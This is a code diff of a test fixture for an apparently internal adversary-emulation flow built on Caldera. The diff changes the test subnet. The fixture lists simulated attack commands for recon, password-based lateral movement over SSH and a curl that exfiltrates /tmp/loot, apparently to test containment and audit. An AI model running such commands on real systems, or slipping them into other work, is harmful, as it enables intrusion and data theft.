@@ -94,7 +94,7 @@ from app.services.operation.runner import OperationRunner
 # The internal-only curated-case stand-in the frontend flow drives.
 #
 # It has three abilities, each reaching a distinct internal destination
-# (⊆ 172.21.0.0/24). Containment therefore passes (no external destination) and
+# (⊆ 192.168.20.0/24). Containment therefore passes (no external destination) and
 # the preview / isolation / audit steps operate over more than one command, so
 # the "1:1 audit per executed command" assertion is meaningful rather than
 # trivially satisfied by a single link.
@@ -107,9 +107,9 @@ _CASE_SLUG = "shadowray"
 # base64 (the client only base64-decodes strictly valid input), meaning the
 # audit trail records these exact command texts.
 _EXECUTED_COMMANDS: dict[str, str] = {
-    "a-recon": "curl http://172.21.0.20/recon",
-    "a-lateral": "sshpass -p x ssh red@172.21.0.21 whoami",
-    "a-exfil": "curl http://172.21.0.22/collect --data @/tmp/loot",
+    "a-recon": "curl http://192.168.20.30/recon",
+    "a-lateral": "sshpass -p x ssh red@192.168.20.31 whoami",
+    "a-exfil": "curl http://192.168.20.32/collect --data @/tmp/loot",
 }
 
 # The Caldera link statuses per ability (0 => sucesso, non-zero => falha). Two
